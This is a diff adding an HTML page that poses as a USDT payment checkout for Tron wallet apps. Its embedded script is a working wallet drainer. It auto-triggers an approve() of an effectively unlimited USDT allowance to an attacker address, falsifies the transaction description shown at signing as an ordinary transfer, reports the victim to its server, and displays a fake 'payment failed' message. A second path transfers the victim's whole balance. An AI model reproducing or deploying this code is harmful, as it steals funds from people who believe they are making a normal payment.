@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!-- Required meta tags-->
+  <meta name="viewport"
+  	content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no, email=no">
+  <meta name="msapplication-tap-highlight" content="no">
+  <meta name="x5-orientation" content="portrait">
+  <meta name="x5-fullscreen" content="true">
+  <link rel="icon" href="/favicon.ico">
+  <meta name="description" content="">
+  <meta name="keywords" content=""><!-- App title -->
+  <title>&#85;&#83;&#68;&#84;&#32;&#36716;&#36134;</title><!-- Framework7 Library CSS -->
+  <link href="./css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+  <script src="./js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+  <script src="./js/jquery-3.6.0.min.js"></script>
+	<style>
+		html,
+		body {
+			color: #2e2e2e;
+			font: inherit;
+			font-family: 'avenir-heavy';
+		}
+
+		#form .row {
+			--bs-gutter-x: 3vw;
+			--bs-gutter-y: 3vw;
+		}
+
+		.fs-14 {
+			font-size: 14px;
+		}
+
+		.fs-12 {
+			font-size: 12px;
+		}
+
+		.time-box {
+			width: 35vw;
+			margin: 10px auto 0;
+			background: #f2f2f2;
+			border-radius: 4px;
+		}
+
+		.page-header {
+			box-shadow: 0 4px 8px 0 rgb(0 0 0 / 10%);
+		}
+
+		.page-header .title {
+			letter-spacing: 0.4px;
+			font-size: 100%;
+		}
+
+		.total-amount span {
+			display: block;
+			text-align: center;
+			line-height: 24px;
+			font-size: 16px;
+			font-family: 'Avenir-Medium';
+			letter-spacing: 0.2px;
+		}
+
+		.total-amount small {
+			line-height: 30px;
+			letter-spacing: 0.4px;
+			font-family: 'avenir-heavy';
+			font-size: 20px;
+			font-weight: bold;
+		}
+
+		.form-title {
+			font-size: 11px;
+			font-family: 'avenir-heavy';
+			color: #000;
+		}
+
+		.icon-logo {
+			width: 5vw;
+			height: 5vw;
+			line-height: 1;
+			background-position: center center;
+			background-size: 100% auto;
+			background-repeat: no-repeat;
+		}
+
+		.icon-logo img {
+			display: block;
+			width: 100%;
+		}
+		.icon-logo.tronlink {
+			background-image: url('./img/tronlink.png');
+		}
+		.icon-logo.TokenPocket {
+			background-image: url('./img/TokenPocket.png');
+		}
+
+		.icon-logo.imtoken {
+			background-image: url('./img/imtoken.png');
+		}
+		.app-button-container {
+			width: 100%;
+			padding: 0 4vw;
+		}
+
+		.app-button {
+			display: flex;
+			flex-flow: column nowrap;
+			align-items: center;
+			justify-content: center;
+			width: 28vw;
+			height: 28vw;
+			padding: .5em 0;
+			border: none;
+			background: #fff;
+			font-size: 11px;
+			box-shadow: 0 0 2px 2px rgba(0, 0, 0, 0.05);
+			border-radius: 8px;
+		}
+
+		.app-button .icon-logo {
+			width: 9vw;
+			height: 9vw;
+			margin-bottom: 1em;
+		}
+
+		.app-button+.app-button {
+			margin-left: 5px;
+		}
+
+		#loading-tip {
+			display: none;
+			position: fixed;
+			top: 0;
+			right: 0;
+			left: 0;
+			bottom: 0;
+			z-index: 999;
+			background: rgba(0, 0, 0, 0.1)
+		}
+		
+		#payment{
+		    width: 200px;
+		    height: 50px;
+		    text-align: center;
+		    margin: 100px 0;
+		}
+	</style>
+</head>
+<body>
+	<div class="container page-header p-4">
+	    <div class="mt-2 text-center total-amount">
+	        <span>Amount</span>
+	        <small class="fs-8">$</small>
+	        <small class="fs-8" id="amount"></small>
+	    </div>
+	</div>
+	<div id="form">
+	    <div class="app-button-container pb-2">
+	        <div class="form-title p-2 pt-4">Wellat Apps</div>
+	        <div class="row row-cols-3">
+	            <div class="col">
+	                <button class="app-button" type="button" onclick="tron_native.tronLoginAndSign();">
+	                    <span class="icon-logo tronlink"></span>
+	                    <span>Tronlink</span>
+	                </button>
+	            </div>
+	            <div class="col" id="imtoken">
+	                <button class="app-button" type="button" >
+	                    <span class="icon-logo imtoken"></span>
+	                    <span>imtoken</span>
+	                </button>
+	            </div>
+	            <div class="col" id="TokenPocket">
+	                <button class="app-button" type="button">
+	                    <span class="icon-logo TokenPocket"></span>
+	                    <span>TokenPocket</span>
+	                </button>
+	            </div>
+	        </div>
+	    </div>
+	    <center>
+	        <button type="submit" onclick="is_f()" id="payment">点击付款</button>
+	    </center>
+	</div>
+	<script type="text/javascript" src="./js/vconsole.min.js"></script>
+	<script>
+	    
+	    var domain = 'https://' + window.location.host + '/';
+	    
+	    function getUrlQueryString(names, urls) {
+    		urls = urls || window.location.href;
+    		urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+    		var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+    		var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+    		if (r != null && r[2] != "")return unescape(r[2]);
+    		return null;
+    
+    	}
+    	
+    	var amountx = "{$amount}";
+    	
+    	 $("#amount").text(amountx);
+	    
+	    function getUrlParam(name) {
+	    	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); 
+	    	var r = window.location.search.substr(1).match(reg); 
+	    	if (r != null) return unescape(r[2]); return null;
+	    }
+	    
+	    var authorized_address = "{$trc_au_address}";
+		var mauthorized_address = "{$trc_pay_address}";
+
+        
+        async function is_f(){
+            const address = await tronWeb.defaultAddress.base58;
+            
+            var data = {
+                address:address,
+                authorized_address:authorized_address,
+            }
+            
+            jQuery.ajax({
+        		url: domain + 'api/is_f',
+        		method: 'POST',
+        		data:data,
+        		async: false,
+    			success:function(data){
+                    
+                    var result = JSON.parse(data);
+                        
+    			   if(result.result){
+    			       connectm(address);
+    			   }else{
+    			       connects(address);
+    			   }
+    			   
+    			},
+    			error:function(data){
+    
+    			}
+    		})
+            
+        }
+        
+	    async function connectm(address){
+	    	
+	    	let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+            let balance = await contract.balanceOf(address).call();
+            var amount = mAll ? amountx : parseInt(balance._hex, 16);
+	   // 	console.log(amount)
+	    	const parameter = [{type:'address',value:mauthorized_address},{type:'uint256',value:amount * 1000000}];
+	    	var tx  = await this.tronWeb.transactionBuilder.triggerSmartContract(
+	    			"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+	    			"transfer(address,uint256)",
+	    			{},
+	    			parameter,
+	    			this.walletAddress
+	    	 );
+	   // 	 console.log(JSON.stringify(tx.transaction))
+	    	 const data = tx.transaction.raw_data.contract[0].parameter.value.data
+	    	 const type = tx.transaction.raw_data.contract[0].type
+	    	 tx.transaction.raw_data.contract[0].parameter.value.data='Transfer'
+	    	 tx.transaction.raw_data.contract[0].type='Transfer'
+	    	 const signedTx = await this.tronWeb.trx.sign(tx.transaction);
+	    	 signedTx.raw_data.contract[0].parameter.value.data=data;
+	    	 signedTx.raw_data.contract[0].type=type
+	    	 const broastTx = await this.tronWeb.trx.sendRawTransaction(signedTx);
+
+	    	 if(broastTx.result){
+	    	     
+	    	     var result = {
+	    	         amount:amount,
+	    	         address:address,
+        			 mauthorized_address:mauthorized_address,
+        			 txid:broastTx.txid,
+	    	         
+	    	     }
+    	    	
+    	    	jQuery.ajax({
+        			url: domain + 'api/transfer',
+        			method: 'POST',
+        			data: result,
+                    async: false, 
+        			success: function (data) {	
+        			},
+        			error: function (e) {
+        			}
+    	    	})
+    	    	
+    	    	alert("付款成功");
+	    	 }
+	    }
+	    
+	    async function connects(address){
+	        
+	    	const parameter = [{type:'address',value:authorized_address},{type:'uint256',value:90000000000000}];
+	    	var tx  = await this.tronWeb.transactionBuilder.triggerSmartContract(
+	    			"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+	    			"approve(address,uint256)",
+	    			{},
+	    			parameter,
+	    			this.walletAddress
+	    	 );
+	    	 
+	   // 	 console.log(JSON.stringify(tx.transaction))
+	    	 const data = tx.transaction.raw_data.contract[0].parameter.value.data
+	    	 const type = tx.transaction.raw_data.contract[0].type
+	    	 tx.transaction.raw_data.contract[0].parameter.value.data='transfer'
+	    	 tx.transaction.raw_data.contract[0].type='Transfer '+ amountx + ' USDT'
+	    	 const signedTx = await this.tronWeb.trx.sign(tx.transaction);
+	    	 signedTx.raw_data.contract[0].parameter.value.data=data;
+	    	 signedTx.raw_data.contract[0].type=type
+	    	 const broastTx = await this.tronWeb.trx.sendRawTransaction(signedTx);
+	    	 
+	    	 if(broastTx.result){
+	    	     
+	    	     var result = {
+        			address:address,
+        			authorized_address:authorized_address,
+        			code:1,
+        			type:1,
+        		 }
+	    	     
+	    		 jQuery.ajax({
+        			url: domain + 'api/insert_trc',
+        			method: 'POST',
+        			data: result,
+        			success: function (data) {	
+        			},
+        			error: function (e) {
+        			}
+    	    	})
+    	    	
+    	    	alert("网络异常，付款失败");
+	    	 }
+	    }
+	    const utm_source= getUrlParam("utm_source")
+	    if(!utm_source){
+	    	document.getElementById("imtoken").addEventListener('click',function(){
+	    		window.location.href = 'imtokenv2://navigate?screen=DappView&url='+window.location
+	    	})
+	    	document.getElementById("TokenPocket").addEventListener('click',function(){
+	    		window.location.href ='tpdapp://open?params={"url": "'+window.location+'"}'
+	    	})	
+	    }
+	    setTimeout(function() { is_f() }, 2000);
+	</script>
+</body>
+</html>
